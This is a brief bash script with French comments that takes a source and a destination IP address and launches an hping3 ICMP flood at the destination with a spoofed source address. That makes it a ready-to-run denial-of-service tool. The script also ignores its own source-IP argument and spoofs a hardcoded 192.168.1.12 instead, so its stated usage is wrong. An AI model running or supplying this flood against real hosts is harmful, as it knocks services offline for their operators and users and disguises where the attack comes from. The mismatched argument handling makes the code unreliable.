#!/bin/bash

# Vérifier le nombre d'arguments
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <source_ip> <destination_ip>"
    exit 1
fi

# Récupérer les adresses IP à partir des arguments
source_ip="$1"
destination_ip="$2"

# Utiliser hping3 avec les adresses IP spécifiées
sudo hping3 -1 --flood -a "192.168.1.12" "$destination_ip"
